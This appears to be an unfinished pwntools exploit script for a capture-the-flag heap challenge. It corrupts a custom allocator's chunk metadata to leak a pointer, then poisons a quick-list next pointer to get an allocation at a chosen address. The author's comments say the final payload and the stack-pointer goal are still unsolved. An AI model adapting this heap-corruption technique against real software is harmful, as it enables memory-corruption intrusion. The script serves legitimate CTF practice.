#!/usr/bin/env python3

from pwn import *

exe = ELF("chal_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a,b : r.sendline(a,b)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

def start_(size, hax0r=False):
    sla(b'>', hex(size).encode())
    if hax0r:
        sla(b'>', '1')
    else:
        sla(b'>', '2')

def create(index, size, content):
    sla(b'>', '1')
    sla(b'>', index)
    sla(b'>', f'{size}'.encode())
    sla(b'>', content)

def show(index):
    sla(b'>', '2')
    sla(b'>', index)

def delete(index):
    sla(b'>', '3')
    sla(b'>', index)

def exit():
    sla(b'>', '4')

SIZE = 0x5000
HALF_SIZE = SIZE//2

def main():
    start_(SIZE)

    #extend the range and overwrite the metadata for the first chunk ptr
    #this may also align future chunks with their own metadata but I'm not sure

    create('1', 0x20, 'C'*0x8)
    create('2', 0x20, 'A'*8)
    create('0', 0x2900, b'B'*0x27c0+(p64(0)+p64(0x20))*7)
    delete('2')
    delete('1')
    show('0')
    r.recvline()
    leak = ru('\n')[-6:]
    leak = uu64(leak)
    target = leak+0xbfc0
    log.info(f"leaked {hex(leak)}")
    delete('0')

    gdb.attach(r, gdbscript="b *not_malloc+462\nb not_free")
    create('0', 0x40, 'C'*0x8)
    create('2', 0x40, 'A'*8)
    delete('2')
    delete('0')

    #overwrite the next ptr in the quick list
    create('1', 0x2900, b'C'*0x2780+p64(target+HALF_SIZE)+p64(0x40)+p64(0)*7+p64(0x40))
    create('0', 0x40, '')

    #this is where the overwrite occurs
    payload = ""
    create('2', 0x40, payload)

    #current problem is that becuase fgets is being used to read the string
    #can't leak another pointer from ld
    #with a pointer to the base of the binary, can overwrite the entries
    #goal is a ptr to the stack
    #good luck!

    #show('0')
    #show('2')

    r.interactive()


if __name__ == "__main__":
    main()
